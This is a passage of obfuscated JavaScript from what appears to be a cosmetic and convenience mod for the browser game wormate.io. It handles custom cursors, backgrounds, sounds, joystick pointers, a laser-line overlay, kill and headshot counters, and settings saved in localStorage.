      dispatchException: function _0x52ada7(_0x37019f) {
        if (this.done) {
          throw _0x37019f;
        }
        var _0x5d3ef1 = this;
        function _0xdb70ad(_0x1f8302, _0x5ce187) {
          _0x21fabf.type = "throw";
          _0x21fabf.arg = _0x37019f;
          _0x5d3ef1.next = _0x1f8302;
          if (_0x5ce187) {
            _0x5d3ef1.method = "next";
            _0x5d3ef1.arg = _0x53711e;
          }
          return !!_0x5ce187;
        }
        for (var _0x54e636 = this.tryEntries.length - 1; _0x54e636 >= 0; --_0x54e636) {
          var _0x147121 = this.tryEntries[_0x54e636];
          var _0x21fabf = _0x147121.completion;
          if (_0x147121.tryLoc === "root") {
            return _0xdb70ad("end");
          }
          if (_0x147121.tryLoc <= this.prev) {
            var _0xc3b928 = _0x1f0c7a.call(_0x147121, "catchLoc");
            var _0x8371f4 = _0x1f0c7a.call(_0x147121, "finallyLoc");
            if (_0xc3b928 && _0x8371f4) {
              if (this.prev < _0x147121.catchLoc) {
                return _0xdb70ad(_0x147121.catchLoc, true);
              }
              if (this.prev < _0x147121.finallyLoc) {
                return _0xdb70ad(_0x147121.finallyLoc);
              }
            } else if (_0xc3b928) {
              if (this.prev < _0x147121.catchLoc) {
                return _0xdb70ad(_0x147121.catchLoc, true);
              }
            } else {
              if (!_0x8371f4) {
                throw Error("try statement without catch or finally");
              }
              if (this.prev < _0x147121.finallyLoc) {
                return _0xdb70ad(_0x147121.finallyLoc);
              }
            }
          }
        }
      },
      abrupt: function _0x41df2c(_0x304717, _0x48220b) {
        for (var _0x239367 = this.tryEntries.length - 1; _0x239367 >= 0; --_0x239367) {
          var _0xde74f7 = this.tryEntries[_0x239367];
          if (_0xde74f7.tryLoc <= this.prev && _0x1f0c7a.call(_0xde74f7, "finallyLoc") && this.prev < _0xde74f7.finallyLoc) {
            var _0x4e2e3e = _0xde74f7;
            break;
          }
        }
        if (_0x4e2e3e && (_0x304717 === "break" || _0x304717 === "continue") && _0x4e2e3e.tryLoc <= _0x48220b && _0x48220b <= _0x4e2e3e.finallyLoc) {
          _0x4e2e3e = null;
        }
        var _0x28e6ed = _0x4e2e3e ? _0x4e2e3e.completion : {};
        _0x28e6ed.type = _0x304717;
        _0x28e6ed.arg = _0x48220b;
        if (_0x4e2e3e) {
          this.method = "next";
          this.next = _0x4e2e3e.finallyLoc;
          return _0x4fb0c1;
        } else {
          return this.complete(_0x28e6ed);
        }
      },
      complete: function _0x31b8bf(_0x358003, _0x530b35) {
        if (_0x358003.type === "throw") {
          throw _0x358003.arg;
        }
        if (_0x358003.type === "break" || _0x358003.type === "continue") {
          this.next = _0x358003.arg;
        } else if (_0x358003.type === "return") {
          this.rval = this.arg = _0x358003.arg;
          this.method = "return";
          this.next = "end";
        } else if (_0x358003.type === "normal" && _0x530b35) {
          this.next = _0x530b35;
        }
        return _0x4fb0c1;
      },
      finish: function _0x249ba2(_0x1c989e) {
        for (var _0x7a07b6 = this.tryEntries.length - 1; _0x7a07b6 >= 0; --_0x7a07b6) {
          var _0xe940ac = this.tryEntries[_0x7a07b6];
          if (_0xe940ac.finallyLoc === _0x1c989e) {
            this.complete(_0xe940ac.completion, _0xe940ac.afterLoc);
            _0x415d48(_0xe940ac);
            return _0x4fb0c1;
          }
        }
      },
      catch: function _0x28edbc(_0x9b703e) {
        for (var _0x404c80 = this.tryEntries.length - 1; _0x404c80 >= 0; --_0x404c80) {
          var _0x3a6e3b = this.tryEntries[_0x404c80];
          if (_0x3a6e3b.tryLoc === _0x9b703e) {
            var _0x452395 = _0x3a6e3b.completion;
            if (_0x452395.type === "throw") {
              var _0x53fd09 = _0x452395.arg;
              _0x415d48(_0x3a6e3b);
            }
            return _0x53fd09;
          }
        }
        throw Error("illegal catch attempt");
      },
      delegateYield: function _0x3e14ab(_0x17d4b8, _0x438deb, _0xfaad72) {
        this.delegate = {
          iterator: _0x47ab27(_0x17d4b8),
          resultName: _0x438deb,
          nextLoc: _0xfaad72
        };
        if (this.method === "next") {
          this.arg = _0x53711e;
        }
        return _0x4fb0c1;
      }
    };
    return _0x52435d;
  }
  function _0x4d6a29(_0x3de50c, _0x1f24ac, _0x5df975, _0x542a57, _0x43937a, _0x3ed830, _0x1cc2b0) {
    try {
      var _0xdffb94 = _0x3de50c[_0x3ed830](_0x1cc2b0);
      var _0x236720 = _0xdffb94.value;
    } catch (_0x3317d3) {
      _0x5df975(_0x3317d3);
      return;
    }
    if (_0xdffb94.done) {
      _0x1f24ac(_0x236720);
    } else {
      Promise.resolve(_0x236720).then(_0x542a57, _0x43937a);
    }
  }
  function _0x16316f(_0x4676b9) {
    return function () {
      var _0x2c5c29 = this;
      var _0x1323d8 = arguments;
      return new Promise(function (_0x3ab1f6, _0xfc79dc) {
        var _0x3c019c = _0x4676b9.apply(_0x2c5c29, _0x1323d8);
        function _0x5f44ff(_0x45e61b) {
          _0x4d6a29(_0x3c019c, _0x3ab1f6, _0xfc79dc, _0x5f44ff, _0x1bb69b, "next", _0x45e61b);
        }
        function _0x1bb69b(_0x4718ac) {
          _0x4d6a29(_0x3c019c, _0x3ab1f6, _0xfc79dc, _0x5f44ff, _0x1bb69b, "throw", _0x4718ac);
        }
        _0x5f44ff(undefined);
      });
    };
  }
  function _0x1a561c(_0x1eddda) {
    '@babel/helpers - typeof';

    _0x1a561c = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function (_0x254403) {
      return typeof _0x254403;
    } : function (_0x14f8b9) {
      if (_0x14f8b9 && typeof Symbol == "function" && _0x14f8b9.constructor === Symbol && _0x14f8b9 !== Symbol.prototype) {
        return "symbol";
      } else {
        return typeof _0x14f8b9;
      }
    };
    return _0x1a561c(_0x1eddda);
  }
  var _0x148f95 = 0;
  var _0x5b6103 = false;
  var _0xff4a8c = 25;
  window.backgroundArena = [{
    nome: "Default",
    uri: atob(savedImages[24])
  }, {
    nome: "sky",
    uri: atob(savedImages[28])
  }, {
    nome: "Green",
    uri: atob(savedImages[29])
  }, {
    nome: "Blue",
    uri: atob(savedImages[37])
  }, {
    nome: "Blue Black",
    uri: atob(savedImages[32])
  }, {
    nome: "Blue Light",
    uri: atob(savedImages[31])
  }, {
    nome: "Desert",
    uri: atob(savedImages[26])
  }, {
    nome: "Textil",
    uri: atob(savedImages[25])
  }, {
    nome: "Sky Blue",
    uri: atob(savedImages[30])
  }, {
    nome: "Sky Purp",
    uri: atob(savedImages[27])
  }, {
    nome: "Sky Violet",
    uri: atob(savedImages[38])
  }, {
    nome: "Sky Orange",
    uri: atob(savedImages[39])
  }];
  window.CursorSystem = {
    cursors: [{
      name: "Turquoise Mouse Pointer",
      url: atob(savedImages[40])
    }, {
      name: "White Mouse Pointer",
      url: atob(savedImages[41])
    }, {
      name: "Pink Octopus Cursor",
      url: atob(savedImages[42])
    }, {
      name: "Beetle Cursor",
      url: atob(savedImages[43])
    }, {
      name: "TikTok Cursor",
      url: atob(savedImages[44])
    }, {
      name: "Watermelon Cursor",
      url: atob(savedImages[45])
    }, {
      name: "Red Lipstick Cursor",
      url: atob(savedImages[46])
    }, {
      name: "Flame Cursor",
      url: atob(savedImages[47])
    }, {
      name: "Cherries Cursor",
      url: atob(savedImages[48])
    }, {
      name: "Pink Hearts Cursor",
      url: atob(savedImages[49])
    }, {
      name: "Spray Can Cursor",
      url: atob(savedImages[50])
    }, {
      name: "Beach Umbrella Cursor",
      url: atob(savedImages[51])
    }, {
      name: "Three-colored Glove Cursor",
      url: atob(savedImages[52])
    }, {
      name: "Pink Dolphin Cursor",
      url: atob(savedImages[53])
    }, {
      name: "Mushroom Cursor",
      url: atob(savedImages[54])
    }, {
      name: "Octopus Glove Cursor",
      url: atob(savedImages[55])
    }, {
      name: "Yellow Cheese Cursor",
      url: atob(savedImages[56])
    }, {
      name: "Roasting Marshmallow Cursor",
      url: atob(savedImages[57])
    }, {
      name: "White Glove Cursor",
      url: atob(savedImages[58])
    }, {
      name: "Red Pepper Cursor",
      url: atob(savedImages[59])
    }, {
      name: "Magic Wand with Golden Star Cursor",
      url: atob(savedImages[60])
    }, {
      name: "Strawberry and Chocolate Ice Cream Cursor",
      url: atob(savedImages[61])
    }, {
      name: "Dagger Cursor",
      url: atob(savedImages[62])
    }, {
      name: "Pizza Slice Cursor",
      url: atob(savedImages[63])
    }, {
      name: "Strawberry Candy Cursor",
      url: atob(savedImages[64])
    }, {
      name: "Rose Branch Cursor",
      url: atob(savedImages[65])
    }, {
      name: "Electrical Plug Cursor",
      url: atob(savedImages[66])
    }, {
      name: "Heart on Stick Cursor",
      url: atob(savedImages[67])
    }],
    apply: function (_0x1f7d6c) {
      try {
        document.body.style.cursor = "url(" + _0x1f7d6c + "), auto";
        const _0x4b1580 = document.querySelectorAll("#game-cont, #game-canvas, canvas, .game-area");
        _0x4b1580.forEach(_0x3581bd => {
          _0x3581bd.style.cursor = "url(" + _0x1f7d6c + "), auto";
        });
        vps.selectedCursor = _0x1f7d6c;
        localStorage.setItem("SaveGamewup", JSON.stringify(vps));
        localStorage.setItem("selectedCursor", _0x1f7d6c);
        return true;
      } catch (_0x2f9c9a) {
        console.error("❌ Failed to apply cursor:", _0x2f9c9a);
        return false;
      }
    },
    reset: function () {
      try {
        document.body.style.cursor = "default";
        const _0x4b8bf1 = document.querySelectorAll("#game-cont, #game-canvas, canvas, .game-area");
        _0x4b8bf1.forEach(_0x3bfb03 => {
          _0x3bfb03.style.cursor = "default";
        });
        vps.selectedCursor = null;
        localStorage.setItem("SaveGamewup", JSON.stringify(vps));
        localStorage.removeItem("selectedCursor");
        return true;
      } catch (_0x4d8f2c) {
        console.error("❌ Failed to reset cursor:", _0x4d8f2c);
        return false;
      }
    },
    getSaved: function () {
      return localStorage.getItem("selectedCursor") || vps.selectedCursor || null;
    },
    loadSaved: function () {
      const _0x2569dc = this.getSaved();
      if (_0x2569dc) {
        this.apply(_0x2569dc);
        return _0x2569dc;
      }
      return null;
    }
  };
  document.addEventListener("DOMContentLoaded", function () {
    setTimeout(() => {
      if (window.CursorSystem) {
        window.CursorSystem.loadSaved();
      }
    }, 1000);
  });
  var _0x5d648b = null;
  var _0x16c0a6 = true;
  var _0x37c8a7 = 2;
  var _0x247e3c = null;
  var _0x1de86b = 1;
  var _0x5f5546 = null;
  var _0x24f576 = {};
  window.createLine = function (_0x58ba97, _0x1dcf9b) {
    var _0x1b449f = new PIXI.Graphics();
    var _0x164a6d = 16766720;
    if (vps.laserColor && typeof vps.laserColor === "string") {
      _0x164a6d = parseInt(vps.laserColor.replace("#", ""), 16);
    }
    _0x1b449f.lineStyle(0.1, _0x164a6d, 1);
    _0x1b449f.moveTo(0, 0);
    _0x1b449f.lineTo(0, 0);
    _0x1b449f.zIndex = 20;
    _0x1b449f.name = "lineHS";
    _0x1b449f.alpha = 0;
    _0x58ba97.addChild(_0x1b449f);
  };
  window.movimentaLinha = function () {
    try {
      if (!_wup._anApp.dh.ch.Nm) {
        return;
      }
      var _0x4ceb59 = _wup._anApp.og.af.ng.mf.getChildByName("lineHS");
      var _0x174187 = _wup._anApp.dh.ch.Nm.oc;
      var _0x2d1e59 = _0x174187.position.x;
      var _0x47a431 = _0x174187.position.y;
      var _0x416461 = 16766720;
      if (vps.laserColor && typeof vps.laserColor === "string") {
        _0x416461 = parseInt(vps.laserColor.replace("#", ""), 16);
      }
      _0x4ceb59.clear();
      _0x4ceb59.lineStyle(0.1, _0x416461, 1);
      _0x4ceb59.moveTo(0, 0);
      _0x4ceb59.lineTo(_0x2d1e59, _0x47a431);
      if (vps.laserActive) {
        _0x4ceb59.alpha = vps.laserOpacity || 0.3;
      } else {
        _0x4ceb59.alpha = 0;
      }
    } catch (_0x211ce2) {
      console.error(_0x211ce2);
    }
  };
  window.updateGamePointers = function (_0x33135d, _0x21f224) {
    if (!_wup._anApp.dh.ch.Nm || !_wup._anApp.og.af.ng.Tg) {
      return;
    }
    if (vps.joystickType === 6) {
      return;
    }
    let _0x30ef30 = null;
    if (vps.joystickType === 1) {
      _0x30ef30 = "img_p_1";
    } else if (vps.joystickType === 2) {
      _0x30ef30 = "img_p_2";
    } else if (vps.joystickType === 3) {
      _0x30ef30 = "img_p_3";
    } else if (vps.joystickType === 4) {
      _0x30ef30 = "img_p_4";
    } else if (vps.joystickType === 5) {
      _0x30ef30 = "img_p_5";
    }
    const _0x17329c = document.getElementById(_0x30ef30);
    if (_0x17329c) {
      if (_0x33135d && _0x21f224 && (Math.abs(_0x21f224.x) > 0.05 || Math.abs(_0x21f224.y) > 0.05)) {
        const _0x253251 = window.innerWidth / 2;
        const _0x4d4a13 = window.innerHeight / 2;
        _0x17329c.style.left = _0x253251 + _0x21f224.x * 60 - 8 + "px";
        _0x17329c.style.top = _0x4d4a13 + _0x21f224.y * 60 - 8 + "px";
        _0x17329c.style.opacity = "1";
      } else if (!_0x33135d) {
        if (vps.joystickType === 2 || vps.joystickType === 3) {
          if (vps.joystick && vps.joystick.mode === "dynamic") {
            _0x17329c.style.opacity = "0";
          } else {
            _0x17329c.style.opacity = "0.25";
          }
        } else {
          _0x17329c.style.opacity = "0.25";
        }
      }
    }
  };
  window.updateJoystickPointers = function (_0x5e81d2, _0x4d1fd5) {
    if (!window.joystickPointers || !_wup._anApp.dh.ch.Nm) {
      return;
    }
    let _0x5f4f8f = "mp_1";
    if (vps.joystickType === 2 || vps.joystickType === 4 || vps.joystickType === 5) {
      _0x5f4f8f = "mp_2";
    } else if (vps.joystickType === 3) {
      _0x5f4f8f = "mp_3";
    }
    Object.keys(window.joystickPointers).forEach(function (_0x2ce91b) {
      window.joystickPointers[_0x2ce91b].visible = false;
    });
    const _0x2a5dd4 = window.joystickPointers[_0x5f4f8f];
    if (_0x2a5dd4 && _wup._anApp.dh.ch.Nm.oc) {
      _0x2a5dd4.visible = true;
      _0x2a5dd4.alpha = _0x5e81d2 ? 1 : 0.25;
      const _0x568c78 = _wup._anApp.dh.ch.Nm.oc.position;
      const _0x535b0a = 60;
      _0x2a5dd4.x = _0x568c78.x + Math.cos(_0x4d1fd5) * _0x535b0a;
      _0x2a5dd4.y = _0x568c78.y + Math.sin(_0x4d1fd5) * _0x535b0a;
    }
  };
  var _0x5bab76 = {
    ref: [],
    hs: {},
    library: {
      headshot: [atob(savedImages[34]), atob(savedImages[99]), atob(savedImages[90]), atob(savedImages[100]), atob(savedImages[101]), atob(savedImages[102]), atob(savedImages[103]), atob(savedImages[91]), atob(savedImages[92]), atob(savedImages[93]), atob(savedImages[94]), atob(savedImages[95]), atob(savedImages[96]), atob(savedImages[97])],
      monsterKill: [atob(savedImages[98]), atob(savedImages[104]), atob(savedImages[105])]
    },
    fxdo: function (_0x488c9e) {
      if (window.vps.soundEnabled && _0x5bab76[_0x488c9e] && typeof _0x5bab76[_0x488c9e].play === "function") {
        _0x5bab76[_0x488c9e].play();
      }
    }
  };
  _0x5bab76.headshot = {
    playing: function () {
      return false;
    },
    play: function () {
      if (!window.vps.soundEnabled) {
        return;
      }
      try {
        const _0x1f1fd8 = window.vps.soundSettings.headshotSound;
        const _0x47d596 = _0x5bab76.library.headshot[_0x1f1fd8];
        const _0x1b4661 = new Audio(_0x47d596);
        _0x1b4661.volume = window.vps.soundSettings.volume / 100;
        _0x1b4661.play();
      } catch (_0x1e3440) {}
    }
  };
  _0x5bab76.monsterKillSound = {
    playing: function () {
      return false;
    },
    play: function () {
      if (!window.vps.soundEnabled) {
        return;
      }
      try {
        const _0x1819de = window.vps.soundSettings.monsterKillSound;
        const _0x9ef533 = _0x5bab76.library.monsterKill[_0x1819de];
        const _0xe2ef74 = new Audio(_0x9ef533);
        _0xe2ef74.volume = window.vps.soundSettings.volume / 100;
        _0xe2ef74.play();
      } catch (_0x210f2f) {}
    }
  };
  window._wup = {
    memory: {},
    mySkin: null,
    customPaths: {
      map: {},
      texture: "default.png",
      addMapping: function (_0x2c7bf5, _0x32a8ec, _0xdd35f9) {
        if (!this.map) {
          this.map = {};
        }
        this.map[_0x2c7bf5] = {
          x: _0x32a8ec || 0,
          y: _0xdd35f9 || 0
        };
      }
    },
    _ass_type: [],
    deathMarker: {
      lastDeathPos: null,
      deathMark: null,
      blinkTimer: null,
      removeTimer: null,
      saveDeath: function () {
        if (window.playerCoords) {
          this.lastDeathPos = {
            x: window.playerCoords.x,
            y: window.playerCoords.y
          };
        }
      },
      showDeath: function () {
        if (!this.lastDeathPos) {
          return;
        }
        this.removeDeath();
        if (this.deathMark) {
          try {
            this.deathMark.destroy({
              children: true,
              texture: false,
              baseTexture: false
            });
          } catch (_0x446cc3) {}
        }
        this.deathMark = new PIXI.Text("X", {
          fontFamily: "PTSans",
          fontSize: "12px",
          fill: "red",
          align: "center",
          fontWeight: "bold",
          stroke: "white",
          strokeThickness: 1
        });
        this.deathMark.anchor.set(0.5);
        this.deathMark.position.x = this.lastDeathPos.x;
        this.deathMark.position.y = this.lastDeathPos.y;
        this.deathMark.zIndex = 1000;
        if (window._wupin && _wupin.myLocation && _wupin.myLocation.parent) {
          _wupin.myLocation.parent.addChild(this.deathMark);
        }
        let _0x333572 = true;
        this.blinkTimer = setInterval(() => {
          if (this.deathMark) {
            _0x333572 = !_0x333572;
            this.deathMark.visible = _0x333572;
          }
        }, 500);
        this.removeTimer = setTimeout(() => {
          this.removeDeath();
        }, 25000);
      },
      removeDeath: function () {
        if (this.blinkTimer) {
          clearInterval(this.blinkTimer);
          this.blinkTimer = null;
        }
        if (this.removeTimer) {
          clearTimeout(this.removeTimer);
          this.removeTimer = null;
        }
        if (this.deathMark) {
          if (this.deathMark.parent) {
            this.deathMark.parent.removeChild(this.deathMark);
          }
          try {
            this.deathMark.destroy();
          } catch (_0x59c953) {}
          this.deathMark = null;
        }
      }
    },
    testSkinMod: function _0x1795cc(_0x33d0f8) {
      var _0x3b3d27 = typeof _0x33d0f8 === "string";
      _0x33d0f8 = parseInt(_0x33d0f8);
      if (_0x3b3d27 && isNaN(_0x33d0f8)) {
        return false;
      } else {
        return parseInt(_0x33d0f8) >= 399 && parseInt(_0x33d0f8) < 8999;
      }
    },
    testWear: function _0x2d86fb(_0x4991c5) {
      var _0x544434 = typeof _0x4991c5 === "string";
      _0x4991c5 = parseInt(_0x4991c5);
      if (_0x544434 && isNaN(_0x4991c5)) {
        return false;
      } else {
        return parseInt(_0x4991c5) >= 399 && parseInt(_0x4991c5) < 8999;
      }
    },
    isNumberValid: function _0x4365b2(_0x1a62ac) {
      return _0x1a62ac !== "" && _0x1a62ac !== null && _0x1a62ac !== undefined && !isNaN(_0x1a62ac);
    },
    validInputWear: function _0x31515b(_0x322f2a) {
      var _0x539138 = _wup.testWear(_0x322f2a);
      var _0x5429d9 = typeof skinId === "string";
      if (!_0x539138 && !_0x5429d9) {
        return _0x322f2a;
      }
      return 0;
    },
    validInput: function _0x549803(_0x48ad82) {
      var _0x114eb6 = _wup.testSkinMod(_0x48ad82);
      var _0x30cd4d = typeof _0x48ad82 === "string";
      if (!_0x114eb6 && !_0x30cd4d) {
        return _0x48ad82;
      }
      try {
        return encodeURI(35);
      } catch (_0x22499d) {
        return encodeURI(35);
      }
    },
    fullscreen: null,
    joystick: function _0x40dd20(_0x3a0f29) {
      var _0x3dfb27 = {
        checked: true,
        color: "red",
        mode: "dynamic",
        positionMode: "L",
        size: 100,
        pxy: 100
      };
      return _0x3dfb27;
    },
    load_con: function _0x48abe5() {
      $(".selecionar-sala-v2").click(function (_0x2621c1) {
        _0x2621c1.preventDefault();
        var _0x43b6ab = $(this).attr("data-con") || vps.con;
        var _0x23a1e0 = $(this).attr("data-type");
        ctxx.addRoom($(this).attr("data-room"));
        _0x380234.dh.Zp = function (_0x1a1787, _0x531844, _0x49da9e) {
          vps.con = _0x49da9e ? _0x1a1787 : _0x43b6ab || _0x1a1787;
          _wup.Zp(vps.con, _0x531844);
        };
        _0x380234.Pn();
      });
    },
    fnSaveGame: function _0x4d5b26() {
      var _0x66dca2 = $("#saveGame");
      _0x66dca2.prop("checked", vps.saveGame);
      _0x66dca2.change(function () {
        if (!this.checked) {
          var _0x256757 = confirm("English:\nAttention: the records will be deleted; Confirm?\n\nArabic:\nتنبيه: سيتم حذف السجلات، هل تؤكد؟");
          $(this).prop("checked", !_0x256757);
          if (!this.checked) {
            _wup.fnSetCounts("zerar");
          }
        }
        vps.saveGame = this.checked;
        ctxx.hsTotal.alpha = this.checked ? 1 : 0;
        ctxx.killTotal.alpha = this.checked ? 1 : 0;
        localStorage.setItem("SaveGamewup", this.checked ? JSON.stringify(vps) : null);
      });
    },
    fnSetCounts: function _0x29d56b(_0x24f106, _0x2ba521) {
      var _0x470a18 = function _0x5933a4(_0x4c795f, _0x588249, _0x5d17fa, _0x12e22d) {
        _wup.setCountGame(_0x4c795f, _0x588249, _0x5d17fa, _0x12e22d);
      };
      if (_0x24f106 === "count") {
        vps.kill = (vps.kill || 0) + (_0x2ba521 ? 0 : 1);
        vps.headshot = (vps.headshot || 0) + (_0x2ba521 ? 1 : 0);
        vps.HOL = vps.headshot > vps.HOL ? vps.headshot : vps.HOL;
        vps.tkill = vps.tkill + (_0x2ba521 ? 0 : 1);
        vps.theadshot = vps.theadshot + (_0x2ba521 ? 1 : 0);
      }
      if (_0x24f106 === "open") {
        vps.kill = 0;
        vps.headshot = 0;
        if (vps.saveGame) {}
      }
      if (_0x24f106 === "close") {
        if (vps.saveGame) {
          vps.died = (vps.died || 0) + 1;
        } else {
          _wup.fnSetCounts("zerar");
        }
      }
      if (_0x24f106 === "zerar") {
        vps.kill = 0;
        vps.tkill = 0;
        vps.headshot = 0;
        vps.theadshot = 0;
        vps.died = 0;
      }
      _0x470a18(vps.kill, vps.headshot, vps.tkill, vps.theadshot);
      localStorage.setItem("SaveGamewup", JSON.stringify(vps));
    },
    setCountGame: function _0x3e8e1d(_0xae0915, _0xc5c6f5, _0x1dbbe9, _0x2ee171) {
      if (!vps.saveGame) {
        ctxx.hsTotal.alpha = 0;
        ctxx.killTotal.alpha = 0;
      }
      ctxx.hs.text = _0xc5c6f5;
      ctxx.hsTotal.text = _0x2ee171;
      ctxx.kill.text = _0xae0915;
      ctxx.killTotal.text = _0x1dbbe9;
    },
    startGame: function () {
      this.deathMarker.showDeath();
    },
    stopGame: function () {
      this.deathMarker.saveDeath();
    },
    ismobile: _0x51d931(),
    Zp: undefined
  };
  window.vps = {
    favoriteSkins: [],
    skinr: {},
    sg: [],
    s_l: "https://25yt551.github.io/worm2/",
    pm: {},
    j: null,
    pk: 0,
    pk0: "",
    pk1: "",
    pk2: "",
    pk3: "",
    pk4: "",
    pk5: "",
    pk6: "",
    z: 1,
    c_v: 222,
    c_1: "UP",
    c_2: "TeamUP",
    c_3: "wormup",
    c_4: "wormate.io",
    c_5: "please don't copy my code",
    d_1: "VlZBPQ==",
    d_2: "VkdWaGJWVlE=",
    d_3: "ZDI5eWJYVnc=",
    d_4: "VjI5eWJXRjBaUzVwYnc9PQ==",
    d_5: "VUd4bFlYTmxJR1J2YmlkMElHTnZjSGtnYlhrZ1kyOWtaUT09",
    a: 0,
    b: 0,
    c: 0,
    d: 0,
    e: 0,
    f: "",
    g: 36,
    smoothCamera: 0.5,
    eat_animation: 0.0025,
    PortionSize: localStorage.PotenciadorSize || 1,
    PortionAura: localStorage.PotenciadorAura || 1,
    PortionTransparent: 0.8,
    FoodTransparent: 0.3,
    FoodShadow: localStorage.ComidaShadow || 1,
    FoodSize: localStorage.ComidaSize || 1,
    version: 0,
    headshot: 0,
    kill: 0,
    hudSettings: {
      mode: 0,
      wi: 0.5
    },
    bannedWordsEnabled: false,
    bannedWords: [],
    theadshot: 0,
    tkill: 0,
    died: 0,
    start: 0,
    HOL: 0,
    flx: 0,
    vp: false,
    tk: null,
    country: null,
    finish: 0,
    saveGame: false,
    mobile: false,
    joystick: null,
    configJoystick: {
      buttons: {
        respawn: {
          label: "RESPAWN",
          labelAbbreviation: "RP",
          active: false,
          action: "gtr.gtrass6()"
        },
        lobby: {
          label: "HOME",
          labelAbbreviation: "H",
          active: true,
          action: "gtr.gtrass5()"
        },
        rotate: {
          label: "ROTATE",
          labelAbbreviation: "A",
          active: true,
          action: "gtr.gtrass4()"
        },
        snail: {
          label: "SNAIL",
          labelAbbreviation: "B",
          active: true,
          action: "gtr.gtrass3()"
        },
        swap: {
          label: "SWAP",
          labelAbbreviation: "SW",
          active: false,
          action: "gtr.gtr_skinr()"
        },
        zoomplus: {
          label: "Z+",
          labelAbbreviation: "+",
          active: true,
          action: "gtr.gtrass1()"
        },
        zoomminus: {
          label: "Z-",
          labelAbbreviation: "-",
          active: true,
          action: "gtr.gtrass2()"
        },
        zoom: {
          label: "x1",
          labelAbbreviation: "x1",
          active: true,
          action: "gtr.gtrass7()"
        },
        laser: {
          label: "LASER",
          labelAbbreviation: "L",
          active: true,
          action: "gtr.gtrass12()"
        }
      },
      typeZoom: ["btn", "range"],
      typeCurrent: "btn",
      typeName: ["abb"],
      typeCurrentName: "abb"
    },
    joystickType: 1,
    display: {
      customClock: null,
      clock: {
        x: 60,
        y: 60
      },
      top: {
        x: 225,
        y: 1
      },
      default: false,
      custom: false,
      m: {
        x: 60,
        y: 60
      },
      r: {
        x: 225,
        y: 1
      },
      ms: false
    },
    PropertyManager: {},
    acs: true,
    lr: 10,
    con: null,
    params: "",
    arrow: true,
    activeBadLang: false,
    soundEnabled: true,
    soundSettings: {
      headshotSound: 0,
      monsterKillSound: 0,
      volume: 50
    },
    messageSettings: {
      defaultMessages: false,
      killMsg: "Well Done!",
      headshotMsg: "HEADSHOT",
      showKillName: true,
      showHeadshotName: true,
      killNamePos: "after",
      headshotNamePos: "after",
      killMsgType: "preset",
      headshotMsgType: "preset",
      killCustomText: "",
      headshotCustomText: ""
    },
    activeZoom: true,
    activeZoomMobile: true,
    top10Show: [],
    background: null,
    backgroundMap: false,
    nickname: null,
    code: null,
    configZoom: {
      limitDown: 0.5,
      step: 0.25,
      closeUp: 0.5,
      closeDown: 1
    },
    laserActive: false,
    laserColor: "#FFD700",
    laserOpacity: 0.3,
    enemyNameColor: null,
    enemyNameFontSize: null,
    novidadewormup: 0
  };
  function _0xfd33c2() {
    const _0x2b65e3 = window._wup._anApp;
    if (_0x2b65e3 && _0x2b65e3.dh && _0x2b65e3.dh.Fh) {
      for (let _0x40259c in _0x2b65e3.dh.Fh) {
        let _0x34841b = _0x2b65e3.dh.Fh[_0x40259c];
        if (_0x34841b && _0x34841b.Om && _0x34841b.Eh && _0x34841b.Eh.ma) {
          var _0x227652 = _0x34841b.Eh.ma;
          if (window.vps.bannedWordsEnabled) {
            _0x227652 = _0x4d2813(_0x34841b.Eh.ma, false);
          }
          _0x34841b.Om.text = _0x16c0a6 ? _0x227652 : "-----";
        }
      }
    }
  }
  var _0x1e1393 = localStorage.getItem("wup_version");
  var _0x731714 = localStorage.getItem("SaveGamewup");
  var _0x1cdd44 = localStorage.getItem("wup_config");
  _0x731714 &&= JSON.parse(_0x731714);
  try {
    var _0xd7520e = localStorage.getItem("SaveGamewup");
    if (_0xd7520e) {
      var _0x5e3e99 = JSON.parse(_0xd7520e);
      if (_0x5e3e99.skinr) {
        vps.skinr = _0x5e3e99.skinr;
      }
    }
    var _0x4ee98a = localStorage.getItem("SaveGameup");
    if (_0x4ee98a) {
      var _0x24bd4a = JSON.parse(_0x4ee98a);
      if (_0x24bd4a.favoriteSkins) {
        vps.favoriteSkins = _0x24bd4a.favoriteSkins;
      }
    }
  } catch (_0x25be93) {
    console.warn("Could not load saved settings:", _0x25be93);
  }
  if (_0x731714) {
    if (_0x731714.laser && !_0x731714.laserOpacity) {
      var _0x178537 = parseFloat(_0x731714.laser);
      _0x731714.laserOpacity = Math.max(0.1, Math.min(1, _0x178537));
      delete _0x731714.laser;
    }
  }
  if (!vps.laserOpacity) {
    vps.laserOpacity = 0.3;
  }
  for (var _0x50d4b8 in _0x731714) {
    switch (_0x50d4b8) {
      case "configJoystick":
        if (!_0x731714[_0x50d4b8]) {
          break;
        }
        vps[_0x50d4b8] = _0x731714[_0x50d4b8];
        for (var _0x39b23e in _0x731714[_0x50d4b8].buttons) {
          vps[_0x50d4b8].buttons[_0x39b23e] = _0x731714[_0x50d4b8].buttons[_0x39b23e];
        }
        for (var _0xf243 in _0x731714[_0x50d4b8]) {
          vps[_0x50d4b8][_0xf243] = _0x731714[_0x50d4b8][_0xf243];
        }
        break;
      case "joystick":
        vps[_0x50d4b8] = _wup.joystick();
        for (var _0x4518ad in _0x731714[_0x50d4b8]) {
          vps[_0x50d4b8][_0x4518ad] = _0x731714[_0x50d4b8][_0x4518ad];
        }
        break;
      case "display":
        for (var _0x23a6ac in _0x731714[_0x50d4b8]) {
          vps[_0x50d4b8][_0x23a6ac] = _0x731714[_0x50d4b8][_0x23a6ac];
        }
        break;
      default:
        vps[_0x50d4b8] = _0x731714[_0x50d4b8];
        break;
    }
  }
  if (!vps.version || vps.version !== _0x37c8a7) {
    vps.version = _0x37c8a7;
    vps.joystick = _wup.joystick();
  }
  if (_0x731714 && _0x731714.joystickType) {
    vps.joystickType = _0x731714.joystickType;
  } else if (!vps.joystickType) {
    vps.joystickType = 1;
  }
  const _0x2a3f2a = [1, 2, 3, 4, 5, 6];
  if (!_0x2a3f2a.includes(vps.joystickType)) {
    vps.joystickType = 1;
  }
  setTimeout(() => {
    if (gtr.updateJoystickSwitchButton) {
      gtr.updateJoystickSwitchButton();
    }
  }, 1000);
  vps.loading = true;
  window.respawnFn = function () {
    const _0xa0ae42 = {};
    if (vps.PropertyManager) {
      _0xa0ae42.skinId = vps.PropertyManager.lj;
      _0xa0ae42.eyesId = vps.PropertyManager.mj;
      _0xa0ae42.mouthId = vps.PropertyManager.nj;
      _0xa0ae42.glassesId = vps.PropertyManager.pj;
